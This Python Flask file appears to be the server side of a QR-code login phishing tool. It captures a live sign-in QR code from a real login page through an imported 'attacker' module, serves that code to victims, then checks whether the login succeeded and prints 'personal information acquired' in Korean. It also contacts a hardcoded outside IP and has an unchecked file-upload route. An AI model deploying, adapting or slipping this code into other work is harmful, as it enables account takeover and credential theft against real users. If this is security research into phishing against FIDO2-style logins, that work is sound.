from flask import Flask, request, render_template, send_file
import attacker
import logging
import shutil
import time
import requests
from threading import Thread
app = Flask(__name__)


@app.route("/", methods=['POST'])  #post 안쓰면 index.html이 안뜨나?
def hello():
    url = "http://203.253.23.36:5000"
    im_url = "../service/fido2_phishing/public/images/nvidia_signin_with_qr.png"
    response = requests.get(url)
    if response.status_code == 200:
        shutil.copy(im_url, "static/nvidia_signin_with_qr.png")
        return "done"
    else:
        logging.warning("failed capturing qr")
    return "hello"

@app.route("/", methods=['GET'])
def root():
    return render_template("index.html")


@app.route("/signin")
def signin():
    (driver, qrImageFileName) = attacker.GetQR()
    Thread(target = attacker_task, args=(driver,)).start()
    return send_file(qrImageFileName, mimetype='image/png')


def attacker_task(driver):
    time.sleep(60)
    if driver.title == "로그인 성공":
        print("개인 정보 취득 성공")
    driver.quit()


@app.route("/second")
def twofactor():
    url = "http://203.253.23.36:5000"
    im_url = "../service/fido2_phishing/public/images/email.png"
    response = requests.post(url)
    if response.status_code == 200:
        shutil.copy(im_url, "static/email.png")
        return "done"
    else:
        logging.warning("failed capturing qr")
    return "hello"


@app.route("/api/qr/upload", methods=['POST'])
def qrUploadImage():
    qrImagePath = "/home/ubuntu/fido_phishing/static/nvidia_signin_with_qr.png"

    logging.info("upload >>>>>>>>>>>")
    requestFile = request.files['file'] 
    requestFile.save(qrImagePath)
    logging.info("upload <<<<<<<<<<<")
    # file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))

    return "upload success" 


if __name__ == "__main__":
    app.run(host='0.0.0.0',port=5000,debug=True)

